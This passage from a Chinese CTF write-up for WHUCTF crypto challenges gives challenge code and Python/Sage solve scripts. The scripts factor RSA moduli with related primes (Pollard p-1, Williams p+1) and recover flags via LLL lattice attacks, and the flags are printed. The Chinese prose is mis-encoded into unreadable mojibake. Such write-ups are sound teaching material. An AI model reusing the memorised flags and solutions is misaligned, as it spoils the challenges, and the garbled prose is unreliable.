class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c2 = &#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c3 = &#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c4 = &#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># c1 = (6053032598894343876848386724367478876865502990878797490385487692233771017587839889683279773931697102081210221515871925626229356354906807395177342943323369, 4066195854081844630643812355140109730178549671457699640787009592379117222130777528564788537029636082768525403919530491221982157867347461546035515101540809)</span><br><span class="hljs-comment"># c2 = (3881600892538209342174115382004433032693183438455968854185245139152150453077746028435728337685187304179257593974737056409431270271087770400534952463611803, 3170419555737452151768856928448822332346045957475336562622244748908867061340721719260259808765271614258250388620180512676045609008728482012225062330421389)</span><br><span class="hljs-comment"># c3 = (12299016617136978588548772285625358530978334196485520160172325214608426825374255755330322407319092229940503630270734074076341447314630647646764214262929507, 318163940794629731124968470499655451861010987042419720693423620230895540439020747998494269609254222775880714679954773027280497632868550785421041286883861)</span><br><span class="hljs-comment"># c4 = (4549315768074822845197072475333248869579555413221208949230121240611191001190288208256119819724334902434536556333152862828649067092565476816480268615884657, 1882968780168858989700488482275734089425710600149658668167954773629584030303631176914870357507995175067079535271674721507969999430710585448040194277936142)</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong> å¯ä»¥çœ‹å‡ºï¼Œflagè¢«åˆ†æˆäº†å››éƒ¨åˆ†ï¼Œè€Œä¸”å‰ä¸¤ä¸ªä¹‹é—´å­˜åœ¨å…³ç³»ï¼Œåä¸¤ä¸ªä¹‹é—´å­˜åœ¨å…³ç³»ã€‚</p><p>é‡ç‚¹åœ¨äº<code>p2 = (p1 - 1) // 2</code>,<code>p2 = (p1 + 1) // 2</code>ï¼Œæˆ‘ä»¬æ¥é€ä¸ªåˆ†æã€‚</p><p><strong>Part1ï¼š</strong></p><span>$$\because p_2=(p_1-1)//2 \\\therefore 2*N_2=2*p_2*q_2=(p_1-1)q_2 \\å³ p_1-1|2*N2 \\ \therefore a^{2*N_2} \equiv a^{q_2*(p1-1)}\equiv1 \mod p_1 \\\therefore a^{2*N_2}-1 = kp_1 \\å½“ç„¶ a^{2*N_2}-1 \mod N_1 = kp_1 \\\therefore p_1=gcd(a^{2*N2}-1 \mod N_1,N_1)$$</span><p>ä¹‹å$q_1,p_2,q_2$ä¾¿éƒ½èƒ½æ±‚å‡ºæ¥ï¼Œä¹‹åå°±æ˜¯ç®€å•çš„RSA</p><p><strong>Part2:</strong></p><p>å¯¹äºwilliam p+1å…‰æ»‘ç®—æ³•ä¸­ï¼Œp+1ä¸ºå…‰æ»‘æ•°ï¼Œè®¾Bä¸ºp+1æœ€å¤§çš„å…‰æ»‘å› å­ï¼Œè¦æ±‚å¾—ä¸‹æ ‡ä¸ºBçš„é˜¶ä¹˜B!å¢å¡æ–¯åºåˆ—ï¼Œç›®çš„å°±æ˜¯ä¿è¯(p+1)|B!ï¼Œè€Œæœ¬é¢˜ä¸­èƒ½å¤Ÿçœ‹å‡º$2*N_4&#x3D;(p_3+1)*q_4$å¿…ç„¶æ˜¯$(p_3+1)$çš„æ•´æ•°å€ã€‚</p><p>ä¹‹åå°±åˆ©ç”¨å¢å¡æ–¯åºåˆ—çš„æ€§è´¨æ¥æ±‚$p_3ã€‚å³p_3|(V_{2*N_4}-2)$</p><p>$\therefore p_3|gcd(V_{2*N_4}-2,N_3)$</p><p>$\therefore p_3&#x3D;gcd(V_{2*N_4}-2\mod N_3,N_3)$</p><p>ä¹‹ååŒä¸Šï¼Œè„šæœ¬å¦‚ä¸‹</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> Matrix<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br>c1 = (<span class="hljs-number">6053032598894343876848386724367478876865502990878797490385487692233771017587839889683279773931697102081210221515871925626229356354906807395177342943323369</span>, <span class="hljs-number">4066195854081844630643812355140109730178549671457699640787009592379117222130777528564788537029636082768525403919530491221982157867347461546035515101540809</span>)<br>c2 = (<span class="hljs-number">3881600892538209342174115382004433032693183438455968854185245139152150453077746028435728337685187304179257593974737056409431270271087770400534952463611803</span>, <span class="hljs-number">3170419555737452151768856928448822332346045957475336562622244748908867061340721719260259808765271614258250388620180512676045609008728482012225062330421389</span>)<br>c3 = (<span class="hljs-number">12299016617136978588548772285625358530978334196485520160172325214608426825374255755330322407319092229940503630270734074076341447314630647646764214262929507</span>, <span class="hljs-number">318163940794629731124968470499655451861010987042419720693423620230895540439020747998494269609254222775880714679954773027280497632868550785421041286883861</span>)<br>c4 = (<span class="hljs-number">4549315768074822845197072475333248869579555413221208949230121240611191001190288208256119819724334902434536556333152862828649067092565476816480268615884657</span>, <span class="hljs-number">1882968780168858989700488482275734089425710600149658668167954773629584030303631176914870357507995175067079535271674721507969999430710585448040194277936142</span>)<br>e=<span class="hljs-number">65537</span><br>n1,n2,n3,n4=c1[<span class="hljs-number">0</span>],c2[<span class="hljs-number">0</span>],c3[<span class="hljs-number">0</span>],c4[<span class="hljs-number">0</span>]<br>enc1,enc2,enc3,enc4=c1[<span class="hljs-number">1</span>],c2[<span class="hljs-number">1</span>],c3[<span class="hljs-number">1</span>],c4[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#å‰åŠ</span><br>p1=gmpy2.gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>*n2,n1)-<span class="hljs-number">1</span>,n1)<br>q1=n1//p1<br>p2=(p1-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>q2=n2//p2<br>phi1=(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>phi2=(p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)<br>d1=gmpy2.invert(e,phi1)<br>d2=gmpy2.invert(e,phi2)<br>m1=<span class="hljs-built_in">pow</span>(enc1,d1,n1)<br>m2=<span class="hljs-built_in">pow</span>(enc2,d2,n2)<br><span class="hljs-comment">#print(m1,m2)</span><br>ans1=long_to_bytes(m1)[:<span class="hljs-number">11</span>]<br>ans2=long_to_bytes(m2)[:<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(ans1,ans2)<br><br><span class="hljs-comment">#ååŠ</span><br><span class="hljs-comment">#çŸ©é˜µå¿«é€Ÿå¹‚</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_pow_mod</span>(<span class="hljs-params">matrix, exp, mod</span>):<br>    result = Matrix.eye(matrix.rows)  <span class="hljs-comment"># å•ä½çŸ©é˜µ</span><br>    base = matrix<br>    <span class="hljs-keyword">while</span> exp &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> exp % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            result = (result * base) % mod<br>        base = (base * base) % mod<br>        exp //= <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment">#è®¡ç®—å¢å¡æ–¯åºåˆ—</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lucas_nth_mod</span>(<span class="hljs-params">n, P, m</span>):<br>    M = Matrix([[P, -<span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>]])      <span class="hljs-comment"># è½¬æ¢ä¸ºçŸ©é˜µå½¢å¼</span><br>    vec = Matrix([P, <span class="hljs-number">2</span>])               <span class="hljs-comment"># åˆå§‹å‘é‡ L1 = P, L0 = 2</span><br>    M_n = matrix_pow_mod(M, n, m)<br>    result = M_n * vec<br>    <span class="hljs-keyword">return</span> result[<span class="hljs-number">1</span>] % m<br><br>P = <span class="hljs-number">3</span>                                   <span class="hljs-comment">#è¦æ±‚ä¸ºå¤§äº2çš„æ•´æ•°</span><br>n = n4*<span class="hljs-number">2</span><br>v_n = lucas_nth_mod(n, P, n3)        <span class="hljs-comment">#ä¸‹æ ‡ä¸ºnçš„å¢å¡æ–¯åºåˆ—</span><br><br>p3=gmpy2.gcd(<span class="hljs-built_in">int</span>(v_n)-<span class="hljs-number">2</span>,n3)<br>q3=n3//p3<br>p4=(p3+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>q4=n4//p4<br>phi3=(p3-<span class="hljs-number">1</span>)*(q3-<span class="hljs-number">1</span>)<br>phi4=(p4-<span class="hljs-number">1</span>)*(q4-<span class="hljs-number">1</span>)<br>d3=gmpy2.invert(e,phi3)<br>d4=gmpy2.invert(e,phi4)<br>m3=<span class="hljs-built_in">pow</span>(enc3,d3,n3)<br>m4=<span class="hljs-built_in">pow</span>(enc4,d4,n4)<br><span class="hljs-comment">#print(m3,m4)</span><br>ans3=long_to_bytes(m3)[:<span class="hljs-number">11</span>]<br>ans4=long_to_bytes(m4)[:<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(ans3,ans4)<br><br><span class="hljs-built_in">print</span>(ans1+ans2+ans3+ans4)<br><span class="hljs-comment">#b&#x27;whuctf&#123;real&#x27; b&#x27;ly_sp3cia1_&#x27;</span><br><span class="hljs-comment">#b&#x27;P0llard_4nd&#x27; b&#x27;_w1ll1ams!&#125;&#x27;</span><br><span class="hljs-comment">#b&#x27;whuctf&#123;really_sp3cia1_P0llard_4nd_w1ll1ams!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ez-lattice"><a href="#ez-lattice" class="headerlink" title="ez_lattice"></a>ez_lattice</h3><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&quot;whuctf&#123;&#125;&quot;</span><br>blen = <span class="hljs-number">512</span><br><br>l = <span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>                          <br>n = <span class="hljs-number">2</span><br>X = []<br>a = [bytes_to_long(flag[i * l: i * l + l]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]   <span class="hljs-comment">#å‰ä¸¤ä¸ªå››åˆ†ä¹‹ä¸€æ®µåˆ†åˆ«è½¬æ¢æˆæ•´æ•°</span><br>b = <span class="hljs-number">0</span><br>p = getPrime(blen)                              <span class="hljs-comment">#512bitç´ æ•°</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    X.append(getRandomNBitInteger(blen))        <span class="hljs-comment">#512bitæ•´æ•°</span><br>    b = (a[i] * X[i]) % p<br>    <span class="hljs-keyword">assert</span> b.bit_length() &lt; <span class="hljs-number">110</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X =&quot;</span>, X)<br><br><span class="hljs-comment"># p = 12478746590758967738992827236548867094406642228843048782158822830242432957850861746109083849369751421558416546441433265483311369062332823391326650330844473</span><br><span class="hljs-comment"># X = [4370703796271085517745653374714633557060694569231794372714420305839580193452505356598920188429238758568075323630107438853033389535935767953293146851021439, 5636765597544539887670148818611437395262628189014720546978418282055551396918915796702935478309173130501906553399905160951176701403838275497327658585404887]</span><br><br>n = <span class="hljs-number">2</span><br>X = []<br>a = [bytes_to_long(flag[i * l: i * l + l]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)]<br><span class="hljs-built_in">print</span>(a)<br>p = getPrime(blen)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    X.append(getRandomNBitInteger(blen))<br>    b = (a[i] * X[i]) % p<br>    <span class="hljs-keyword">assert</span> b.bit_length() &lt;= <span class="hljs-number">55</span><br><br>s = getRandomNBitInteger(<span class="hljs-number">55</span>)<br>P = p - s<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P =&quot;</span>, P)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X =&quot;</span>, X)<br><br><span class="hljs-comment"># P = 8064317391291915578249751043887298750752952396481901402238164933671762816998644264248732894561122039999833298392825353792148892469165631966482732750535761</span><br><span class="hljs-comment"># X = [6042201174605160506707043360458329015685676206288676104013330039569480295420873678739841513174948925787517746114885517054730046775608073287427260847787072, 6232867934334525782602291010514616748943593081406115516232887372014738839717093295759414233886061184914495957664550361507367497641317336980894814940037711]</span><br></code></pre></td></tr></table></figure><p><strong>å‚è€ƒï¼š</strong> <a href="https://tover.xyz/p/wieners-lattices-equations/">Wienerâ€™s v.s Lattices â€”â€” Axâ‰¡y(mod P)çš„æ–¹ç¨‹è§£æ³•ç¬”è®° | Toverâ€™s Blog</a></p><p><strong>åˆ†æï¼š</strong> flagåˆè¢«åˆ†æˆäº†ä¸¤éƒ¨åˆ†ï¼Œæ„Ÿè°¢å‡ºé¢˜äººæ€»æ˜¯å…ˆé€æˆ‘ä¸€åŠflagã€‚</p><p><strong>part1:</strong> éå¸¸å¸¸è§„çš„æ ¼ï¼Œæ„é€ </p><span>$$(a[0],a[1],k)\begin{pmatrix}1 & 0 & X[0] \\0 & 1 & X[1] \\0 & 0 & p    \\\end{pmatrix}=(a[0],a[1],b_1+b_2)$$</span><p><strong>part2:</strong></p><p>å‚è€ƒäº†å¤§ä½¬åšå®¢ä¹‹åæ‰æœ‰æ€è·¯ï¼Œæ€»ä¹‹å°±æ˜¯è¦æŠŠX[2],X[3]åˆ†å¼€æ¥è®¨è®ºï¼Œæ„é€ æ ¼</p><p>AM&#x3D;B :</p><span>$$(k_1k_2,a_1k_2,a_2k_1,a_1a_2) \\\begin{pmatrix}1 & P & 0 & P^2 \\0 & X_1 & X_1 & X_1P \\0 & 0 & -X_2 & X_2P \\0 & 0 & 0 & X_1X_2\\ \end{pmatrix}\\=(k_1k_2,k_2(b_1-sk_1),b_1k_2-b_2k_1,(b_1-k_1s)(b_2-k_2s)$$</span><p>ç”±äºè¿™ä¸ªæ ¼å¹¶ä¸æ»¡è¶³<strong>Hermiteå®šç†</strong>ï¼Œå› æ­¤éœ€è¦é…å¹³ï¼Œé…å¹³ç³»æ•°å¯ä»¥å‚è€ƒå¤§ä½¬åšå®¢ã€‚</p><span>$$B \approx (P^{2\alpha},P^{2\alpha+\gamma},P^{\alpha+\beta},P^{2\alpha+2\gamma})\\\begin{pmatrix}P^{2\gamma} & 0 & 0 & 0\\0 & P^{\gamma} & 0 & 0 \\0 & 0 & P^{\alpha-\beta+2\gamma} & 0 \\0 & 0 & 0 & 1\\\end{pmatrix}$$</span><p>å…¶ä¸­$\gamma&#x3D;\frac12,\alpha&#x3D;\frac{5}{14},\beta&#x3D;0$</p><p>æ±‚å‡ºçŸ©é˜µBä¹‹åå†ä¹˜ä¸ŠMçš„é€†ï¼Œä»è€Œå¾—åˆ°çŸ©é˜µAï¼Œå†åˆ©ç”¨aä¸­å…³ç³»æ±‚å‡º$a_1,a_2$</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment">#part1</span><br>p = <span class="hljs-number">12478746590758967738992827236548867094406642228843048782158822830242432957850861746109083849369751421558416546441433265483311369062332823391326650330844473</span><br>X = [<span class="hljs-number">4370703796271085517745653374714633557060694569231794372714420305839580193452505356598920188429238758568075323630107438853033389535935767953293146851021439</span>, <span class="hljs-number">5636765597544539887670148818611437395262628189014720546978418282055551396918915796702935478309173130501906553399905160951176701403838275497327658585404887</span>]<br><br>M = matrix(ZZ,[[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,X[<span class="hljs-number">0</span>]],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,X[<span class="hljs-number">1</span>]],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p]])<br>L = M.LLL()[<span class="hljs-number">0</span>]<br>a1=long_to_bytes(<span class="hljs-built_in">abs</span>(L[<span class="hljs-number">0</span>]))<br>a2=long_to_bytes(<span class="hljs-built_in">abs</span>(L[<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">print</span>(a1,a2)<br><span class="hljs-comment">#b&#x27;whuctf&#123;&#x27; b&#x27;Lattice&#x27;</span><br><br><span class="hljs-comment">#part2</span><br>P = <span class="hljs-number">8064317391291915578249751043887298750752952396481901402238164933671762816998644264248732894561122039999833298392825353792148892469165631966482732750535761</span><br>X = [<span class="hljs-number">6042201174605160506707043360458329015685676206288676104013330039569480295420873678739841513174948925787517746114885517054730046775608073287427260847787072</span>, <span class="hljs-number">6232867934334525782602291010514616748943593081406115516232887372014738839717093295759414233886061184914495957664550361507367497641317336980894814940037711</span>]<br><br>x1,x2 = X<br>a=<span class="hljs-number">5</span>/<span class="hljs-number">14</span><br>M1=<span class="hljs-built_in">int</span>(P^<span class="hljs-number">0.5</span>)<br>M2=<span class="hljs-built_in">int</span>(P^(<span class="hljs-number">1</span>+a))<br><br>L2=Matrix(ZZ,[[P,   M1*P,       <span class="hljs-number">0</span>,    P^<span class="hljs-number">2</span>],<br>            [<span class="hljs-number">0</span>,    M1*x1,   M2*x1,   x1*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,  -M2*x2,   x2*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,       <span class="hljs-number">0</span>,  x1*x2]])<br>B=L2.LLL()[<span class="hljs-number">0</span>]<br>A=B*L2^(-<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#print(A)</span><br>a3=gcd(A[<span class="hljs-number">1</span>],A[<span class="hljs-number">3</span>])        <span class="hljs-comment">#å› ä¸ºæ²¡æœ‰ä¿è¯a3,a4ä¸ºç´ æ•°ï¼Œå…¶å®æ˜¯k*a3ï¼Œè¿™é‡Œkåˆšå¥½æ˜¯1ï¼Œå¦åˆ™å¯èƒ½éœ€è¦çˆ†ç ´</span><br>a4=A[<span class="hljs-number">3</span>]//a3<br><span class="hljs-comment">#print(a3)</span><br><span class="hljs-comment">#print(a4)</span><br><span class="hljs-comment">#print(a3*a4)</span><br><br>a3=long_to_bytes(<span class="hljs-built_in">int</span>(a3))<br>a4=long_to_bytes(<span class="hljs-built_in">int</span>(a4))<br><span class="hljs-built_in">print</span>(a3,a4)<br><span class="hljs-built_in">print</span>(a1+a2+a3+a4)<br><span class="hljs-comment">#b&#x27;_1s_P0w&#x27; b&#x27;erFu1!&#125;&#x27;</span><br><span class="hljs-comment">#b&#x27;whuctf&#123;Lattice_1s_P0werFu1!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Siestaâ€™s-revenge"><a href="#Siestaâ€™s-revenge" class="headerlink" title="Siestaâ€™s_revenge"></a>Siestaâ€™s_revenge</h3><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&quot;whuctf&#123;&#125;&quot;</span><br>blen = <span class="hljs-number">512</span><br><br>p = getPrime(blen)<br>s = getRandomNBitInteger(<span class="hljs-number">100</span>)<br>P = p + s<br><br>t = <span class="hljs-number">2</span><br>X = []<br>a = [getPrime(<span class="hljs-number">160</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>    X.append(inverse(a[i], p))<br><br>key = sha256(<span class="hljs-built_in">str</span>(a[<span class="hljs-number">0</span>]*a[<span class="hljs-number">1</span>]).encode()).digest()[:<span class="hljs-number">16</span>]<br>iv = <span class="hljs-string">b&quot;0&quot;</span> * <span class="hljs-number">16</span><br>AES = AES.new(key, AES.MODE_CBC, iv)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X =&quot;</span>, X)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P =&quot;</span>, P)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct =&quot;</span>, AES.encrypt(pad(flag, AES.block_size)))<br><br><span class="hljs-comment"># X = [1266403423628708294851978766647131186574350037928491893316575383770634141679199238688724846443316942748685589080912612989737322832820423142859211423222170, 10633805933378187507165706136587361125130747673943368523389315948924728188453225153073019422908293191827053741582511390426559341625596650317484672418362991]</span><br><span class="hljs-comment"># P = 12727949469666331910572325155797935927989546075198211256583307434798528241134917675474139742863165705376701853130873014549089300596914514323642506815012401</span><br><span class="hljs-comment"># ct = b&#x27;\xe9\x87\x942\xbc\x94`t\x85^r\xb8\xd2\x00\xfb\xb0Ni\x08\xcf\x07\xf1\xae\x95U&#123;\xf1\xd4\xda&#125;@H&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong> æ€ä¹ˆè¯´å‘¢ï¼Œè·Ÿä¸Šé¢˜ä¸èƒ½è¯´ååˆ†ç±»ä¼¼å§ï¼Œåªèƒ½è¯´ä¸€æ¨¡ä¸€æ ·ï¼Œåªæ˜¯så˜å¤§äº†è€Œå·²ï¼Œä½†å®è·µè¯æ˜ï¼Œå®ƒå¹¶æ²¡æœ‰å½±å“æˆ‘ä»¬æ ¼æ”»å‡»æˆåŠŸã€‚ï¼ˆæ‰€ä»¥è¯´ä¸ç†è§£å‡ºé¢˜äººçš„é¢„æœŸæ•ˆæœæ˜¯ä»€ä¹ˆï¼Œå¸Œæœ›èƒ½è®²ä¸€è®²ï¼‰</p><p>é‚£ä¹ˆæ”»å‡»æ€è·¯å°±åŒä¸Š</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><br>X = [<span class="hljs-number">1266403423628708294851978766647131186574350037928491893316575383770634141679199238688724846443316942748685589080912612989737322832820423142859211423222170</span>, <span class="hljs-number">10633805933378187507165706136587361125130747673943368523389315948924728188453225153073019422908293191827053741582511390426559341625596650317484672418362991</span>]<br>P = <span class="hljs-number">12727949469666331910572325155797935927989546075198211256583307434798528241134917675474139742863165705376701853130873014549089300596914514323642506815012401</span><br>ct = <span class="hljs-string">b&#x27;\xe9\x87\x942\xbc\x94`t\x85^r\xb8\xd2\x00\xfb\xb0Ni\x08\xcf\x07\xf1\xae\x95U&#123;\xf1\xd4\xda&#125;@H&#x27;</span><br><br>x1,x2 = X<br>a=<span class="hljs-number">5</span>/<span class="hljs-number">14</span><br>M1=<span class="hljs-built_in">int</span>(P^<span class="hljs-number">0.5</span>)<br>M2=<span class="hljs-built_in">int</span>(P^(<span class="hljs-number">1</span>+a))<br><br>L2=Matrix(ZZ,[[P,   M1*P,       <span class="hljs-number">0</span>,    P^<span class="hljs-number">2</span>],<br>            [<span class="hljs-number">0</span>,    M1*x1,   M2*x1,   x1*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,  -M2*x2,   x2*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,       <span class="hljs-number">0</span>,  x1*x2]])<br><br>B=L2.LLL()[<span class="hljs-number">0</span>]<br>A=B*L2^(-<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#print(A)</span><br>a=gcd(A[<span class="hljs-number">1</span>],A[<span class="hljs-number">3</span>])<br>b=gcd(A[<span class="hljs-number">2</span>],A[<span class="hljs-number">3</span>])<br>ans1=long_to_bytes(<span class="hljs-built_in">int</span>(a))<br>ans2=long_to_bytes(<span class="hljs-built_in">int</span>(b))<br><span class="hljs-comment">#print(ans1,ans2)</span><br><br>key = sha256(<span class="hljs-built_in">str</span>(a*b).encode()).digest()[:<span 